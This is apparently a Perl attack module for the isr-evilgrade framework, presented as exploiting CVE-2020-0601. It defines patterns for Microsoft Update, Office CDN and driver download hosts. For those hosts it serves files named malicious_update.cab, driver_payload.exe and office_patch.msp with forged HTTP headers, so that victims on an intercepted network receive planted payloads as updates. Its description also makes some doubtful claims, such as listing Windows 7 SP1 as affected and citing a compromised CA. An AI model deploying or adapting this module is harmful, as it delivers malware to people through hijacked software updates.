###############
# windows_cryptoapi.pm
#
# CVE-2020-0601: Windows CryptoAPI spoofing vulnerability
# Allows forged ECC certificates to pass Windows signature validation
# Enables MITM attacks with spoofed certificates and compromised CAs (emudhra)
#
# This file is part of isr-evilgrade, www.faradaysec.com .

package modules::windows_cryptoapi;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'Windows CryptoAPI',
    'version'     => '1.0',
    'appver'      => 'Windows 7 SP1, Windows 10 < 19041',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Exploits CVE-2020-0601: Windows CryptoAPI ECC certificate validation bypass.
Allows spoofed certificates to be validated as legitimate by Windows systems.
Useful in combination with compromised CAs (emudhra) for MITM attacks.
Targets Windows Update, Office updates, driver updates.
    },
    'vh' => '(update\.microsoft\.com|windowsupdate\.microsoft\.com|officecdn\.microsoft\.com|driver\.download|msdn\.microsoft\.com)',
    'request' => [
        {
            'req'   => '/update/v3/cab/',
            'type'  => 'file',
            'file'  => './include/cryptoapi/malicious_update.cab',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/vnd.ms-cab-compressed\r\n"
                . "Content-Length: 1048576\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '/download/.*\.exe',
            'type'  => 'file',
            'file'  => './include/cryptoapi/driver_payload.exe',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=driver.exe\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '/officecdn/.*\.msp',
            'type'  => 'file',
            'file'  => './include/cryptoapi/office_patch.msp',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=update.msp\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
